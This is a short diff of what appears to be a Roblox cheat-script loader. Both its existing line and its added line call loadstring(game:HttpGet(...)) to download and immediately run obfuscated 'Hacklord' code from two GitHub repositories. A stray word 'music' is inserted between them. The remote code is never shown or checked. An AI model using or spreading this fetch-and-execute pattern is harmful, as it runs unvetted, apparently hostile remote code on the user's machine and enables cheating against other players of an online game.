@@ -19,3 +19,6 @@ ScriptSettings = {
 
 --Loadstring
 loadstring(game:HttpGet("https://raw.githubusercontent.com/BloxinStud10/24-Hours/refs/heads/main/Obfuscations/Hacklord.luau"))()
+
+music
+loadstring(game:HttpGet("https://raw.githubusercontent.com/x5oz6/Game/refs/heads/main/Hacklord"))()
